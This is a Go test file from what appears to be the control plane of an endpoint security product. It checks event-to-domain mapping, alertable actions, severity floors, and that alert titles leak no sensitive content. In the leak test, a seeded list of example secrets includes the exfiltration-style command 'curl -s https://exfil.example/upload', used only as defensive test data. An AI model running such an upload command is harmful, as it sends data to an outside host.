package controlplane_test

import (
	"strings"
	"testing"

	"github.com/lucianoengel/openshield/internal/controlplane"
	corev1 "github.com/lucianoengel/openshield/internal/core/corev1"
)

// TestUnifiedDomainMappingIsEnumComplete (XDR-2) walks the generated EventKind_name map — the CLOSED
// enum itself, not a hand-copied list — and requires every real kind to map to a domain. Adding a kind
// to event.proto without extending unifiedDomainFor FAILS here, rather than silently producing a domain
// whose detections never reach correlation.
func TestUnifiedDomainMappingIsEnumComplete(t *testing.T) {
	valid := map[string]bool{"dlp": true, "hips": true, "nips": true}
	for num, name := range corev1.EventKind_name {
		kind := corev1.EventKind(num)
		domain, ok := controlplane.UnifiedDomainFor(kind)
		if kind == corev1.EventKind_EVENT_KIND_UNSPECIFIED {
			if ok {
				t.Errorf("%s mapped to domain %q, want unmapped — an unspecified kind must not be guessed", name, domain)
			}
			continue
		}
		if !ok {
			t.Errorf("%s (%d) has no domain — extend unifiedDomainFor when adding an EventKind", name, num)
			continue
		}
		if !valid[domain] {
			t.Errorf("%s mapped to unknown domain %q", name, domain)
		}
	}
}

// TestUnifiedDomainMapping pins the specific attributions, including the two deliberate calls: a FIM
// delete is an integrity signal (hips), and the ZT access proxy's HTTP_REQUEST decisions land under
// nips because the Event does not distinguish access from egress.
func TestUnifiedDomainMapping(t *testing.T) {
	for _, tc := range []struct {
		kind corev1.EventKind
		want string
	}{
		{corev1.EventKind_EVENT_KIND_FILE_OPENED, "dlp"},
		{corev1.EventKind_EVENT_KIND_FILE_MODIFIED, "dlp"},
		{corev1.EventKind_EVENT_KIND_FILE_CREATED, "dlp"},
		{corev1.EventKind_EVENT_KIND_USB_INSERTED, "dlp"},
		{corev1.EventKind_EVENT_KIND_CLIPBOARD_COPY, "dlp"},
		{corev1.EventKind_EVENT_KIND_PRINT_JOB, "dlp"},
		{corev1.EventKind_EVENT_KIND_PROCESS_EXEC, "hips"},
		{corev1.EventKind_EVENT_KIND_FILE_DELETED, "hips"},
		{corev1.EventKind_EVENT_KIND_RANSOMWARE_SUSPECTED, "hips"},
		{corev1.EventKind_EVENT_KIND_MEMORY_INJECTION_SUSPECTED, "hips"},
		{corev1.EventKind_EVENT_KIND_NETWORK_FLOW, "nips"},
		{corev1.EventKind_EVENT_KIND_HTTP_REQUEST, "nips"},
		{corev1.EventKind_EVENT_KIND_DNS_QUERY, "nips"},
		{corev1.EventKind_EVENT_KIND_SMTP_MESSAGE, "nips"},
	} {
		got, ok := controlplane.UnifiedDomainFor(tc.kind)
		if !ok || got != tc.want {
			t.Errorf("UnifiedDomainFor(%v) = %q,%v; want %q,true", tc.kind, got, ok, tc.want)
		}
	}
}

// TestAlertableActionIsEnumComplete walks the CLOSED Action enum: exactly UNSPECIFIED and ALLOW are
// non-alertable, every other member alerts. A new Action member is alertable by default, which is the
// safe direction — a new verb appears in the stream rather than disappearing from it.
func TestAlertableActionIsEnumComplete(t *testing.T) {
	for num, name := range corev1.Action_name {
		a := corev1.Action(num)
		want := a != corev1.Action_ACTION_UNSPECIFIED && a != corev1.Action_ACTION_ALLOW
		if got := controlplane.AlertableAction(a); got != want {
			t.Errorf("AlertableAction(%s) = %v, want %v", name, got, want)
		}
	}
}

// TestSeverityForDecision: an enforcement action takes a high floor however unconfident the policy was
// (a low-confidence KILL is still a kill), while an observe-only ALERT keeps the confidence bucket, and
// a genuinely critical confidence is never DOWNgraded by the floor.
func TestSeverityForDecision(t *testing.T) {
	for _, tc := range []struct {
		name       string
		action     corev1.Action
		confidence float64
		want       string
	}{
		{"low-confidence kill still high", corev1.Action_ACTION_KILL_PROCESS, 0.10, controlplane.SeverityHigh},
		{"low-confidence deny-exec still high", corev1.Action_ACTION_DENY_EXEC, 0.10, controlplane.SeverityHigh},
		{"low-confidence block still high", corev1.Action_ACTION_BLOCK, 0.30, controlplane.SeverityHigh},
		{"quarantine still high", corev1.Action_ACTION_QUARANTINE_LOCAL, 0.0, controlplane.SeverityHigh},
		{"critical enforcement is not downgraded", corev1.Action_ACTION_BLOCK, 0.95, controlplane.SeverityCritical},
		{"alert keeps its low bucket", corev1.Action_ACTION_ALERT, 0.10, controlplane.SeverityLow},
		{"alert keeps its medium bucket", corev1.Action_ACTION_ALERT, 0.60, controlplane.SeverityMedium},
		{"alert keeps its critical bucket", corev1.Action_ACTION_ALERT, 0.99, controlplane.SeverityCritical},
	} {
		if got := controlplane.SeverityForDecision(tc.action, tc.confidence); got != tc.want {
			t.Errorf("%s: SeverityForDecision(%v, %v) = %q, want %q", tc.name, tc.action, tc.confidence, got, tc.want)
		}
	}
}

// TestAlertTitleCarriesNoContent is the D10/D29 boundary test for the alert title. The title is built
// from the two CLOSED enums and nothing else, so no policy reason string, path, hostname or command
// line can reach the widely-read unified_alerts table through it.
//
// Mutation: build the title from Decision.reason (the tempting shortcut) → the seeded secrets appear in
// the title → this FAILS.
func TestAlertTitleCarriesNoContent(t *testing.T) {
	// The kinds of strings a policy reason, a file target or a network target really carry.
	secrets := []string{
		"/home/alice/salaries-2026.xlsx",
		"internal-payroll.corp.example",
		"curl -s https://exfil.example/upload",
		"matched CPF 123.456.789-09",
		"alice@example.test",
	}
	title := controlplane.AlertTitleFor(corev1.Action_ACTION_KILL_PROCESS, corev1.EventKind_EVENT_KIND_PROCESS_EXEC)
	for _, s := range secrets {
		if strings.Contains(title, s) {
			t.Fatalf("title %q leaked content %q", title, s)
		}
	}
	// It is still a useful label: both closed-enum facts are present.
	if !strings.Contains(title, "kill_process") || !strings.Contains(title, "process_exec") {
		t.Fatalf("title %q lost the action or the event kind", title)
	}
	// And the title is bounded by the enums — never free text of unbounded length.
	if len(title) > 128 {
		t.Fatalf("title is %d bytes; enum-derived titles are short by construction", len(title))
	}
}
